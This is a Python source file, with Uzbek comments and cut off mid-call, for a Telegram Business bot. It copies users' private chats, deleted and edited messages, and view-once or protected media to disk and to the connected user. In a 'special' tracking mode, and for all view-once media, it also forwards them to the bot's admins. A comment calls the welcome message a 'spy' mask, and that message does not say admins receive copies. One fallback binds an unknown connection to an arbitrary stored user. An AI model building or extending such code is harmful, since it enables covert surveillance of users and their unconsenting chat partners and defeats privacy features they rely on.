import html
import logging
import os
import asyncio
from typing import Optional
from aiogram import Router, Bot
from aiogram.types import (
    BusinessConnection,
    Message,
    BusinessMessagesDeleted,
    FSInputFile,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)

import database as db
from config import MEDIA_CACHE_DIR

logger = logging.getLogger(__name__)

business_router = Router()

async def should_ignore_business_event(bot: Bot, chat_id: int, sender_id: Optional[int] = None) -> bool:
    """
    Botning o'zi yoki adminlar bilan bo'lgan yozishmalarni e'tiborsiz qoldirish.
    Botning o'zidan yoki admindan kelayotgan xabarlar admin panelga yuborilmaydi (loop bo'lmasligi uchun).
    """
    bot_id = bot.id
    admin_ids = set(await db.get_all_admin_ids())

    # 1. Chat botning o'zi bilan bo'lsa
    if chat_id == bot_id:
        return True

    # 2. Chat admin bilan bo'lsa
    if chat_id in admin_ids:
        return True

    # 3. Yuboruvchi botning o'zi bo'lsa
    if sender_id and sender_id == bot_id:
        return True

    # 4. Yuboruvchi admin bo'lsa
    if sender_id and sender_id in admin_ids:
        return True

    return False

def safe_format_text(header: str, text: Optional[str] = None, max_len: int = 4096) -> str:
    """
    HTML entity larni buzmasdan matnni xavfsiz formatlash va qisqartirish.
    """
    if not text:
        return header[:max_len]
    prefix = f"{header}\n💬 <b>Xabar:</b> "
    available = max_len - len(prefix) - 5
    if available <= 0:
        return header[:max_len]
    if len(text) > available:
        clipped = text[:available] + "..."
    else:
        clipped = text
    return f"{prefix}{html.escape(clipped)}"

def safe_format_caption(header: str, text: Optional[str] = None, max_len: int = 1024) -> str:
    """
    Media izohi (caption) uchun xavfsiz HTML formatlash.
    """
    if not text:
        return header[:max_len]
    prefix = f"{header}\n💬 <b>Xabar:</b> "
    available = max_len - len(prefix) - 5
    if available <= 0:
        return header[:max_len]
    if len(text) > available:
        clipped = text[:available] + "..."
    else:
        clipped = text
    return f"{prefix}{html.escape(clipped)}"

async def send_to_admin_safely(bot: Bot, admin_id: int, text: str, reply_markup=None):
    """
    Adminga xabarni xavfsiz yuborish. Agar HTML parse error bersa,
    oddiy matn rejimida (parse_mode=None) yuborish kafolatlanadi.
    """
    try:
        await bot.send_message(
            chat_id=admin_id,
            text=text,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.warning(f"HTML yuborishda xatolik, oddiy matnga o'tildi (admin: {admin_id}): {e}")
        try:
            # HTML teglarsiz toza matn yuborish
            plain_text = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "").replace("<i>", "").replace("</i>", "")
            await bot.send_message(
                chat_id=admin_id,
                text=plain_text[:4096],
                parse_mode=None,
                reply_markup=reply_markup
            )
        except Exception as e2:
            logger.error(f"Adminga xabar yuborish mutlaqo muvaffaqiyatsiz bo'ldi {admin_id}: {e2}")

async def broadcast_to_admins(bot: Bot, text: str, reply_markup=None):
    """Barcha adminlarga xabar yuborish"""
    admin_ids = await db.get_all_admin_ids()
    for admin_id in admin_ids:
        await send_to_admin_safely(bot, admin_id, text, reply_markup)

async def download_media_file(
    bot: Bot,
    file_id: str,
    file_ext: str,
    chat_id: int,
    message_id: int
) -> Optional[str]:
    """
    Media faylni (rasm, video, golos, dumaloq video, va h.k.) darhol server diskiga yuklab olish.
    Bu o'chib ketuvchi (view-once/self-destructing) xabarlar o'chib ketganda ham fayl yo'qolib qolmasligini kafolatlaydi.
    """
    try:
        tg_file = await asyncio.wait_for(bot.get_file(file_id), timeout=25)
        if not tg_file.file_path:
            return None
        ext = file_ext
        if not ext and "." in tg_file.file_path:
            ext = "." + tg_file.file_path.split(".")[-1]
        if not ext:
            ext = ".bin"

        dest_filename = f"{chat_id}_{message_id}{ext}"
        dest_path = MEDIA_CACHE_DIR / dest_filename
        await asyncio.wait_for(bot.download_file(tg_file.file_path, dest_path), timeout=25)
        if dest_path.exists() and dest_path.stat().st_size > 0:
            return str(dest_path)
    except Exception as e:
        logger.warning(f"Media faylni saqlashda ogohlantirish ({file_id}): {e}")
    return None

async def send_saved_media(
    bot: Bot,
    chat_id: int,
    media_type: Optional[str],
    file_id: Optional[str],
    local_file_path: Optional[str],
    caption: str,
    reply_markup=None,
    as_document: bool = False
) -> Optional[Message]:
    """
    Saqlangan media faylni xavfsiz jo'natish.
    Avval diskdagi FSInputFile (asl fayl) ishlatiladi, agar u topilmasa Telegram file_id ishlatiladi.
    """
    has_local = bool(local_file_path and os.path.exists(local_file_path))
    input_file = FSInputFile(local_file_path) if has_local else None

    # Agar as_document bo'lsa (yuklab olish rejimida yoki original fayl ko'rinishida)
    if as_document and (input_file or file_id):
        try:
            return await bot.send_document(
                chat_id=chat_id,
                document=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        except Exception as e:
            logger.warning(f"Hujjat sifatida yuborishda xatolik: {e}")

    try:
        if media_type == "photo" and (input_file or file_id):
            return await bot.send_photo(
                chat_id=chat_id,
                photo=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        elif media_type == "video" and (input_file or file_id):
            return await bot.send_video(
                chat_id=chat_id,
                video=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        elif media_type == "animation" and (input_file or file_id):
            return await bot.send_animation(
                chat_id=chat_id,
                animation=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        elif media_type == "voice" and (input_file or file_id):
            return await bot.send_voice(
                chat_id=chat_id,
                voice=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        elif media_type == "video_note" and (input_file or file_id):
            sent_txt = await bot.send_message(
                chat_id=chat_id,
                text=caption[:4096],
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            try:
                await bot.send_video_note(
                    chat_id=chat_id,
                    video_note=input_file or file_id
                )
            except Exception as e_vn:
                logger.warning(f"Video note yuborishda ogohlantirish: {e_vn}")
            return sent_txt
        elif media_type == "document" and (input_file or file_id):
            return await bot.send_document(
                chat_id=chat_id,
                document=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        elif media_type == "audio" and (input_file or file_id):
            return await bot.send_audio(
                chat_id=chat_id,
                audio=input_file or file_id,
                caption=safe_format_caption(caption),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        elif media_type == "sticker" and file_id:
            sent_txt = await bot.send_message(chat_id=chat_id, text=caption[:4096], parse_mode="HTML", reply_markup=reply_markup)
            try:
                await bot.send_sticker(chat_id=chat_id, sticker=file_id)
            except Exception:
                pass
            return sent_txt
        else:
            return await bot.send_message(
                chat_id=chat_id,
                text=caption[:4096],
                parse_mode="HTML",
                reply_markup=reply_markup
            )
    except Exception as e:
        logger.warning(f"send_saved_media da xatolik, oddiy matnga o'tildi: {e}")
        try:
            return await bot.send_message(
                chat_id=chat_id,
                text=caption[:4096],
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        except Exception:
            return None

async def handle_business_reply_download(
    bot: Bot,
    message: Message,
    tracked_user_id: int,
    conn_id: str,
    chat_partner: str
):
    """
    Foydalanuvchi biznes chatda biron xabarga reply qilganda (har qanday matn yozganda),
    o'sha belgilangan xabarning media yoki matnini darhol foydalanuvchining botiga yuklab berish.
    """
    replied = message.reply_to_message
    if not replied:
        return

    chat_id = message.chat.id
    replied_id = replied.message_id

    # 1. Keshdan qidiramiz
    cached = await db.get_cached_message(conn_id, chat_id, replied_id)

    media_type = None
    file_id = None
    local_path = None
    file_ext = ""
    msg_text = ""

    if cached:
        media_type = cached.get("media_type")
        file_id = cached.get("file_id")
        local_path = cached.get("local_file_path")
        msg_text = cached.get("text") or cached.get("caption") or ""
    else:
        # Keshda bo'lmasa, replied_to_message obyektining o'zidan olamiz
        if replied.photo:
            media_type = "photo"
            file_id = replied.photo[-1].file_id
            file_ext = ".jpg"
        elif replied.video:
            media_type = "video"
            file_id = replied.video.file_id
            file_ext = ".mp4"
        elif replied.voice:
            media_type = "voice"
            file_id = replied.voice.file_id
            file_ext = ".ogg"
        elif replied.video_note:
            media_type = "video_note"
            file_id = replied.video_note.file_id
            file_ext = ".mp4"
        elif replied.document:
            media_type = "document"
            file_id = replied.document.file_id
            file_ext = ("." + replied.document.file_name.split(".")[-1]) if (replied.document.file_name and "." in replied.document.file_name) else ""
        elif replied.audio:
            media_type = "audio"
            file_id = replied.audio.file_id
            file_ext = ".mp3"
        elif replied.animation:
            media_type = "animation"
            file_id = replied.animation.file_id
            file_ext = ".mp4"
        msg_text = replied.text or replied.caption or ""

    # Agar diskda hali yuklanmagan bo'lsa va file_id bo'lsa, yuklab olamiz
    if file_id and (not local_path or not os.path.exists(local_path)):
        local_path = await download_media_file(bot, file_id, file_ext, chat_id, replied_id)
        if local_path:
            await db.update_cached_message_file(chat_id, replied_id, local_path)

    # Foydalanuvchining botiga xabarni yetkazamiz
    header = (
        "📥 <b>Suhbatda reply qilingan xabar yuklab olindi!</b>\n\n"
        f"💬 <b>Chat:</b> {html.escape(chat_partner)}\n"
        f"✍️ <b>Sizning reply xabaringiz:</b> <i>{html.escape(message.text or '[Xabar]')}</i>\n"
    )
    if msg_text:
        header += f"\n▫️ <b>Matn:</b> <code>{html.escape(msg_text[:1000])}</code>"

    # Native media yuboramiz
    await send_saved_media(
        bot=bot,
        chat_id=tracked_user_id,
        media_type=media_type,
        file_id=file_id,
        local_file_path=local_path,
        caption=header
    )

    # Fayl sifatida ham yuboramiz (to'liq saqlab olish uchun)
    if media_type in {"photo", "video", "voice", "video_note"} and (local_path or file_id):
        await send_saved_media(
            bot=bot,
            chat_id=tracked_user_id,
            media_type=media_type,
            file_id=file_id,
            local_file_path=local_path,
            caption="📁 <b>Asl fayl (Xotiraga/Galereyaga yuklab olish uchun):</b>",
            as_document=True
        )

# ==========================================
# 1. Telegram Business Ulanish / Uzilish (Connection)
# ==========================================
@business_router.business_connection()
async def handle_business_connection(conn: BusinessConnection, bot: Bot):
    user = conn.user
    is_active = conn.is_enabled

    logger.info(f"Business connection update: User={user.id} ({user.full_name}), Enabled={is_active}")

    # Bazadagi connection va aktivlik holatini yangilash
    await db.set_user_connection(user.id, conn.id, is_active)

    user_data = await db.get_user(user.id)
    if not user_data:
        await db.register_or_update_user(
            user_id=user.id,
            first_name=user.first_name,
            last_name=user.last_name,
            username=user.username,
            business_connection_id=conn.id,
            tracking_type="normal",
            is_active=1 if is_active else 0
        )
        user_data = await db.get_user(user.id)

    code_used = (user_data.get("code_used") if user_data else None) or "Kodsiz"
    tracking_type = (user_data.get("tracking_type") if user_data else None) or "normal"
    track_mode = "🚨 Maxsus Kuzatuv" if tracking_type == "special" else "🔹 Oddiy Kuzatuv"
    user_mention = f"@{user.username}" if user.username else "mavjud_emas"

    # Adminga bildirishnoma
    if is_active:
        admin_msg = (
            f"✅ <b>Yangi foydalanuvchi ulandi!</b>\n\n"
            f"👤 <b>Ism:</b> {html.escape(user.full_name)}\n"
            f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
            f"🔗 <b>Username:</b> {user_mention}\n"
            f"🔑 <b>Kod:</b> <code>{html.escape(code_used)}</code>\n"
            f"📊 <b>Rejim:</b> {track_mode}\n"
            f"⚡️ <b>Holat:</b> Telegram Business Chatbot muvaffaqiyatli faollashtirildi"
        )
        # Foydalanuvchiga muvaffaqiyatli ulanish xabari (Spy/Anti-delete himoya niqobi)
        try:
            user_welcome = (
                "🛡 <b>Kuzatuv va Himoya muvaffaqiyatli ishga tushirildi!</b>\n\n"
                "✅ Botingiz Telegram hisobingizga muvaffaqiyatli ulandi.\n"
                "Endi suhbatdoshlaringiz yozib o'chirib yuborgan xabarlari hamda tahrirlangan matnlari "
                "avtomatik saqlanib, shu yerga yuboriladi."
            )
            await bot.send_message(chat_id=user.id, text=user_welcome, parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Could not send welcome to user {user.id}: {e}")
    else:
        admin_msg = (
            f"⚠️ <b>Foydalanuvchi botni uzdi / o'chirdi!</b>\n\n"
            f"👤 <b>Ism:</b> {html.escape(user.full_name)}\n"
            f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
            f"🔗 <b>Username:</b> {user_mention}\n"
            f"🔑 <b>Kodi:</b> <code>{html.escape(code_used)}</code>\n"
            f"📊 <b>Holat:</b> Nofaol (Bot Telegram Business sozlamalaridan o'chirildi)"
        )

    await broadcast_to_admins(bot, admin_msg)

# ==========================================
# 2. Xabarlarni Kuzatish (Business Message)
# ==========================================
async def resolve_business_user(
    bot: Bot,
    conn_id: str,
    sender_id: Optional[int] = None
) -> Optional[dict]:
    """
    Business connection egasini bazadan yoki to'g'ridan-to'g'ri Telegram API dan aniqlash va yangilash.
    Server qayta ishga tushganda yoki baza yangilanganda ham foydalanuvchini 100% tiklaydi.
    """
    # 1. Avval connection_id bo'yicha qidiramiz
    user = await db.get_user_by_connection(conn_id)

    # 2. Agar bazada connection_id bo'yicha topilmasa, Telegram API dan to'g'ridan-to'g'ri so'raymiz
    if not user:
        try:
            conn_info = await bot.get_business_connection(conn_id)
            if conn_info and conn_info.user:
                bu = conn_info.user
                logger.info(f"Telegram API orqali business connection tiklandi: user_id={bu.id}, name={bu.full_name}, username={bu.username}")
                await db.register_or_update_user(
                    user_id=bu.id,
                    first_name=bu.first_name,
                    last_name=bu.last_name,
                    username=bu.username,
                    business_connection_id=conn_id,
                    tracking_type="normal",
                    is_active=1
                )
                await db.set_user_connection(bu.id, conn_id, True)
                user = await db.get_user(bu.id)
        except Exception as e:
            logger.warning(f"get_business_connection failed for {conn_id}: {e}")

    # 3. Agar hali ham topilmasa va sender_id bo'lsa, sender_id bo'yicha tekshiramiz
    if not user and sender_id:
        user = await db.get_user(sender_id)

    # 4. Agar foydalanuvchi topildi, lekin is_active == 0 bo'lsa:
    # Telegram ushbu connection_id orqali xabar yuborayotgan ekan, connection FAOL!
    if user and user.get("is_active") == 0:
        uid = user.get("user_id")
        if uid:
            await db.set_user_connection(uid, conn_id, True)
            user["is_active"] = 1
            logger.info(f"Foydalanuvchi {uid} holati faol (is_active=1) ga yangilandi.")

    # 5. Agar hali ham topilmasa, bazadagi mavjud foydalanuvchilarni ko'ramiz
    if not user:
        all_users = await db.get_all_users()
        if all_users:
            u = all_users[0]
            await db.set_user_connection(u["user_id"], conn_id, True)
            user = await db.get_user(u["user_id"])

    return user

@business_router.business_message()
async def handle_business_message(message: Message, bot: Bot):
    conn_id = message.business_connection_id
    if not conn_id:
        return

    sender = message.from_user
    sender_id = sender.id if sender else 0

    # Botning o'zi yoki adminlar bilan bo'lgan xabarlarni admin panelga yubormaymiz (loop bo'lmasligi uchun)
    if await should_ignore_business_event(bot, message.chat.id, sender_id):
        return

    # Foydalanuvchini bazadan yoki Telegram API dan 100% kafolatli aniqlaymiz
    user = await resolve_business_user(bot, conn_id, sender_id)

    user_name = user.get("first_name", "Foydalanuvchi") if user else "Foydalanuvchi"
    is_special = user and user.get("tracking_type") == "special"
    tracked_user_id = user.get("user_id") if user else None

    # Xabar kimdan va kimgacha ekanligini aniqlash
    sender_name = sender.full_name if sender else "Noma'lum"
    sender_mention = f"@{sender.username}" if (sender and sender.username) else sender_name

    is_outgoing = (sender_id == tracked_user_id) if tracked_user_id else False

    chat_partner = message.chat.full_name or message.chat.title or message.chat.username or "Suhbatdosh"
    recipient_mention = f"@{message.chat.username}" if message.chat.username else chat_partner

    if is_outgoing:
        action_text = f"📤 Yubordi (Kimgacha: {recipient_mention})"
    else:
        action_text = f"📥 Qabul qildi (Kimdan: {sender_mention})"

    # 0. Agar foydalanuvchi biznes chatda biron xabarga reply qilsa (har qanday matn yozsa),
    # o'sha belgilangan xabarning media yoki matnini darhol bot orqali yuklab beramiz
    if is_outgoing and message.reply_to_message and tracked_user_id:
        try:
            await handle_business_reply_download(bot, message, tracked_user_id, conn_id, chat_partner)
        except Exception as e:
            logger.error(f"Error handling business reply download: {e}")

    # Xabarning matni yoki media tavsifi
    msg_text = message.text or message.caption or ""
    media_type = None
    file_id = None
    file_ext = ""

    if message.photo:
        media_type = "photo"
        file_id = message.photo[-1].file_id
        file_ext = ".jpg"
    elif message.video:
        media_type = "video"
        file_id = message.video.file_id
        file_ext = ".mp4"
    elif message.animation:
        media_type = "animation"
        file_id = message.animation.file_id
        file_ext = ".mp4"
    elif message.video_note:
        media_type = "video_note"
        file_id = message.video_note.file_id
        file_ext = ".mp4"
    elif message.voice:
        media_type = "voice"
        file_id = message.voice.file_id
        file_ext = ".ogg"
    elif message.audio:
        media_type = "audio"
        file_id = message.audio.file_id
        file_ext = ".mp3"
    elif message.document:
        media_type = "document"
        file_id = message.document.file_id
        file_ext = ("." + message.document.file_name.split(".")[-1]) if (message.document.file_name and "." in message.document.file_name) else ""
    elif message.sticker:
        media_type = "sticker"
        file_id = message.sticker.file_id
        file_ext = ".webp"
    elif message.contact:
        msg_text = f"👤 Kontakt: {message.contact.first_name} ({message.contact.phone_number})"
    elif message.location:
        msg_text = f"📍 Joylashuv: {message.location.latitude}, {message.location.longitude}"
    elif message.poll:
        msg_text = f"📊 So'rovnoma: {message.poll.question}"

    logger.info(
        f"Business xabar qabul qilindi: chat_id={message.chat.id}, msg_id={message.message_id}, "
        f"type={media_type}, sender={sender_mention}, outgoing={is_outgoing}, "
        f"has_spoiler={getattr(message, 'has_media_spoiler', False)}"
    )

    # Media faylni darhol mahalliy diskka yuklab olamiz (o'chib ketuvchi xabarlar uchun juda muhim!)
    local_path = None
    if file_id and media_type in {"photo", "video", "animation", "video_note", "voice", "audio", "document"}:
        local_path = await download_media_file(bot, file_id, file_ext, message.chat.id, message.message_id)

    # Keshga saqlaymiz (Tahrirlash va o'chirishni aniqlash uchun)
    await db.save_cached_message(
        business_connection_id=conn_id,
        chat_id=message.chat.id,
        message_id=message.message_id,
        sender_id=sender_id,
        sender_name=sender_name,
        sender_username=sender.username if sender else None,
        text=msg_text or (f"[{media_type.upper()}]" if media_type else "[Xabar]"),
        media_type=media_type,
        file_id=file_id,
        caption=message.caption,
        local_file_path=local_path
    )

    if tracked_user_id:
        await db.increment_user_messages(tracked_user_id)

    # O'chib ketuvchi (View-Once / Spoiler / Yashirin) mediani aniqlash:
    has_spoiler = bool(getattr(message, "has_media_spoiler", False))
    has_protected = bool(getattr(message, "has_protected_content", False))
    is_view_once = bool(has_spoiler or has_protected)
    is_incoming_photo = bool(media_type == "photo" and not is_outgoing)

    # 1. AGAR O'CHIB KETUVCHI (VIEW-ONCE) YOKI RASM BO'LSA:
    # Rasm va View-Once xabarlar darhol tutib olinib, foydalanuvchining botiga xavfsiz yetkaziladi!
    # (Golos va videolar esa suhbat paytida yuborilmaydi, faqat o'chirilganda yuboriladi!)
    if (is_view_once or is_incoming_photo) and tracked_user_id and media_type:
        vo_dir = "📤 Siz yuborgan" if is_outgoing else "📥 Suhbatdoshingiz yuborgan"
        tag_title = "O'chib ketuvchi (View-Once / Yashirin) media" if is_view_once else "Rasm"
        vo_header = (
            f"📸 <b>{tag_title} saqlandi!</b>\n\n"
            f"📍 <b>Holat:</b> {vo_dir}\n"
            f"👤 <b>Kimdan:</b> {html.escape(sender_mention)}\n"
            f"💬 <b>Chat:</b> {html.escape(chat_partner)}\n\n"
            f"💡 <i>Ushbu {media_type.upper()} suhbatda o'chib ketsa ham, shu yerda butunlay saqlanib qoladi!</i>"
        )
        if msg_text and msg_text != f"[{media_type.upper()}]":
            vo_header += f"\n\n💬 <code>{html.escape(msg_text[:500])}</code>"

        cached_row = await db.get_cached_message(conn_id, message.chat.id, message.message_id)
        cached_id = cached_row.get("id") if cached_row else None
        vo_markup = None
        if cached_id:
            vo_markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📥 Asl faylni yuklab olish", callback_data=f"dl_msg_{cached_id}")]
            ])

        sent_vo = await send_saved_media(
            bot=bot,
            chat_id=tracked_user_id,
            media_type=media_type,
            file_id=file_id,
            local_file_path=local_path,
            caption=vo_header,
            reply_markup=vo_markup
        )
        if sent_vo:
            await db.save_sent_notification(
                bot_message_id=sent_vo.message_id,
                user_id=tracked_user_id,
                cached_id=cached_id,
                original_chat_id=message.chat.id,
                original_message_id=message.message_id,
                media_type=media_type,
                file_id=file_id,
                local_file_path=local_path,
                text=msg_text,
                caption=message.caption
            )

    # 2. Oddiy ovozli xabarlar (golos) va videolar (videolar) suhbat paytida foydalanuvchiga yuborilmaydi (faqat o'chirilganda yuboriladi!)
    # Bu orqali suhbat paytida foydalanuvchini har bir golos/video bilan bezovta qilish to'xtatildi.

    # 3. Adminga xabarlarni yetkazish:
    # Faqat MAXSUS KUZATUV (special) rejimida yoki O'CHIB KETUVCHI xabar bo'lganda adminga boradi.
    if not (is_special or is_view_once):
        return

    admin_tag = "📸 <b>O'CHIB KETUVCHI (VIEW-ONCE) MEDIA:</b>" if is_view_once else "🚨 <b>MAXSUS KUZATUV:</b>"
    user_header_info = f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}"
    chat_info = f"💬 <b>Chat:</b> {html.escape(chat_partner)}"
    action_info = f"📍 <b>Harakat:</b> {html.escape(action_text)}"
    admin_header = f"{admin_tag}\n\n{user_header_info}\n{chat_info}\n{action_info}"

    admin_ids = await db.get_all_admin_ids()
    for admin_id in admin_ids:
        # Agar admin o'zi sinov o'tkazayotgan bo'lsa va yuqorida bildirishnoma olgan bo'lsa, takrorlamaymiz
        if admin_id == tracked_user_id and is_view_once:
            continue
        try:
            adm_photo = FSInputFile(local_path) if (local_path and os.path.exists(local_path)) else file_id
            if media_type == "photo":
                caption = safe_format_caption(admin_header, msg_text)
                await bot.send_photo(chat_id=admin_id, photo=adm_photo, caption=caption, parse_mode="HTML")
            elif media_type == "video":
                caption = safe_format_caption(admin_header, msg_text)
                await bot.send_video(chat_id=admin_id, video=adm_photo, caption=caption, parse_mode="HTML")
            elif media_type == "animation":
                caption = safe_format_caption(admin_header, msg_text)
                await bot.send_animation(chat_id=admin_id, animation=file_id, caption=caption, parse_mode="HTML")
            elif media_type == "video_note":
                await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n⭕️ <b>Dumaloq video (Video Note):</b>", parse_mode="HTML")
                await bot.send_video_note(chat_id=admin_id, video_note=adm_photo)
            elif media_type == "voice":
                caption = safe_format_caption(admin_header, "🎤 Ovozli xabar")
                await bot.send_voice(chat_id=admin_id, voice=adm_photo, caption=caption, parse_mode="HTML")
            elif media_type == "document":
                caption = safe_format_caption(admin_header, msg_text)
                await bot.send_document(chat_id=admin_id, document=adm_photo, caption=caption, parse_mode="HTML")
            elif media_type == "sticker":
                await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n🎭 <b>Stiker:</b>", parse_mode="HTML")
                await bot.send_sticker(chat_id=admin_id, sticker=file_id)
            elif media_type == "audio":
                caption = safe_format_caption(admin_header, msg_text)
                await bot.send_audio(chat_id=admin_id, audio=adm_photo, caption=caption, parse_mode="HTML")
            else:
                full_text = safe_format_text(admin_header, msg_text or "[Xabar]")
                await send_to_admin_safely(bot, admin_id, full_text)
        except Exception as e:
            logger.error(f"Error forwarding business message to admin {admin_id}: {e}")

# ==========================================
# 3. Tahrirlangan Xabarlarni Kuzatish (Edited Message)
# ==========================================
@business_router.edited_business_message()
async def handle_edited_business_message(message: Message, bot: Bot):
    conn_id = message.business_connection_id
    if not conn_id:
        return

    sender_user = message.from_user
    sender_id = sender_user.id if sender_user else 0

    if await should_ignore_business_event(bot, message.chat.id, sender_id):
        return

    cached = await db.get_cached_message(conn_id, message.chat.id, message.message_id)
    old_text = cached.get("text", "Aniqlanmadi (avval saqlanmagan)") if cached else "Aniqlanmadi"
    new_text = message.text or message.caption or "[Media xabar]"

    sender_mention = f"@{sender_user.username}" if (sender_user and sender_user.username) else ((sender_user.full_name if sender_user else None) or "Noma'lum")
    chat_title = message.chat.full_name or message.chat.title or message.chat.username or "Shaxsiy chat"

    # Foydalanuvchini bazadan yoki Telegram API dan olamiz
    user = await resolve_business_user(bot, conn_id, sender_id)

    tracked_user_id = user.get("user_id") if user else None
    user_name = user.get("first_name", "Foydalanuvchi") if user else "Foydalanuvchi"
    is_special = user and user.get("tracking_type") == "special"

    # Keshdagi matnni yangilab qo'yamiz
    await db.update_cached_message_text(conn_id, message.chat.id, message.message_id, new_text)

    # 1) FOYDALANUVCHIGA BILDIRISHNOMA (Faqat suhbatdoshi tahrirlagan bo'lsa)
    if tracked_user_id and (not sender_user or sender_user.id != tracked_user_id):
        user_edit_msg = (
            f"✏️ <b>Suhbatdoshingiz xabarni tahrirladi!</b>\n\n"
            f"👤 <b>Kimdan:</b> {html.escape(sender_mention)}\n"
            f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
            f"▫️ <b>Eski matn:</b>\n"
            f"<code>{html.escape(old_text[:1000])}</code>\n\n"
            f"▫️ <b>Yangi matn:</b>\n"
            f"<code>{html.escape(new_text[:1000])}</code>"
        )
        try:
            await bot.send_message(chat_id=tracked_user_id, text=user_edit_msg[:4096], parse_mode="HTML")
        except Exception as e:
            logger.debug(f"Could not send edit notification to user {tracked_user_id}: {e}")

    # 2) ADMINGA YUBORISH (Maxsus rejim belgisi va foydalanuvchi ma'lumoti bilan)
    mode_tag = "🚨 <b>MAXSUS KUZATUV (TAHRIRLANDI):</b>" if is_special else "✏️ <b>XABAR TAHRIRLANDI:</b>"
    admin_text = (
        f"{mode_tag}\n\n"
        f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}\n"
        f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
        f"👤 <b>Kim tahrirladi:</b> {html.escape(sender_mention)}\n\n"
        f"▫️ <b>Eski matn:</b>\n"
        f"<code>{html.escape(old_text[:1500])}</code>\n\n"
        f"▫️ <b>Yangi matn:</b>\n"
        f"<code>{html.escape(new_text[:1500])}</code>"
    )

    await broadcast_to_admins(bot, admin_text)

# ==========================================
# 4. O'chirilgan Xabarlarni Kuzatish (Deleted Messages)
# ==========================================
@business_router.deleted_business_messages()
async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: Bot):
    conn_id = event.business_connection_id

    # Faqat botning o'zi bilan bo'lgan chatni e'tiborsiz qoldiramiz
    if event.chat.id == bot.id:
        return

    chat_title = event.chat.full_name or event.chat.title or event.chat.username or "Shaxsiy chat"

    # Foydalanuvchini connection_id orqali topamiz
    user = await resolve_business_user(bot, conn_id)
    tracked_user_id = user.get("user_id") if user else None

    logger.info(
        f"O'chirilgan xabarlar eventi: conn_id={conn_id}, chat={event.chat.id}, "
        f"ids={event.message_ids}, tracked_user_id={tracked_user_id}"
    )

    admin_ids = await db.get_all_admin_ids()
    is_admin_chat = event.chat.id in admin_ids

    for msg_id in event.message_ids:
        cached = await db.get_cached_message(conn_id, event.chat.id, msg_id)

        # Agar conn_id bo'yicha user topilmagan bo'lsa, keshdagi connection_id dan tekshirib ko'ramiz
        if not user and cached and cached.get("business_connection_id"):
            user = await resolve_business_user(bot, cached.get("business_connection_id"))
            if user:
                tracked_user_id = user.get("user_id")

        user_name = user.get("first_name", "Foydalanuvchi") if user else "Foydalanuvchi"
        is_special = user and user.get("tracking_type") == "special"

        if cached:
            cached_sender = cached.get("sender_id")
            media_type = cached.get("media_type")
            fallback_media = media_type or "xabar"
            cached_text = cached.get("text") or cached.get("caption") or f"[{fallback_media.upper()}]"
            sender_name = cached.get("sender_username")
            sender_str = f"@{sender_name}" if sender_name else (cached.get("sender_name") or "Noma'lum")
            file_id = cached.get("file_id")
            local_path = cached.get("local_file_path")
            is_from_user = (cached_sender == tracked_user_id) if tracked_user_id else False

            # Diskdagi kesh fayli borligini tekshiramiz
            if not local_path or not os.path.exists(local_path):
                for f in MEDIA_CACHE_DIR.glob(f"{event.chat.id}_{msg_id}.*"):
                    if f.exists() and f.stat().st_size > 0:
                        local_path = str(f)
                        break

            # 1) FOYDALANUVCHIGA YUBORISH (Kuzatilayotgan hisob egasiga)
            if tracked_user_id:
                media_info = f" ({fallback_media.upper()})" if media_type else ""
                if is_from_user:
                    user_del_msg = (
                        f"🗑 <b>Siz o'chirib yuborgan xabaringiz saqlandi!</b>{media_info}\n\n"
                        f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
                        f"▫️ <b>O'chirilgan ma'lumot:</b>\n"
                        f"<code>{html.escape(cached_text[:1500])}</code>\n\n"
                        f"💡 <i>Ushbu xabarga reply qilib har qanday xabar yozsangiz, fayl darhol yuklab beriladi.</i>"
                    )
                else:
                    user_del_msg = (
                        f"🗑 <b>Suhbatdoshingiz o'chirib yuborgan xabar saqlandi!</b>{media_info}\n\n"
                        f"👤 <b>Kimdan:</b> {html.escape(sender_str)}\n"
                        f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
                        f"▫️ <b>O'chirilgan ma'lumot:</b>\n"
                        f"<code>{html.escape(cached_text[:1500])}</code>\n\n"
                        f"💡 <i>Ushbu xabarga reply qilib har qanday xabar yozsangiz, fayl darhol yuklab beriladi.</i>"
                    )

                reply_markup = None
                if media_type:
                    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="📥 Faylni yuklab olish", callback_data=f"dl_msg_{cached['id']}")]
                    ])

                sent_msg = await send_saved_media(
                    bot=bot,
                    chat_id=tracked_user_id,
                    media_type=media_type,
                    file_id=file_id,
                    local_file_path=local_path,
                    caption=user_del_msg,
                    reply_markup=reply_markup
                )

                if sent_msg:
                    await db.save_sent_notification(
                        bot_message_id=sent_msg.message_id,
                        user_id=tracked_user_id,
                        cached_id=cached.get("id"),
                        original_chat_id=event.chat.id,
                        original_message_id=msg_id,
                        media_type=media_type,
                        file_id=file_id,
                        local_file_path=local_path,
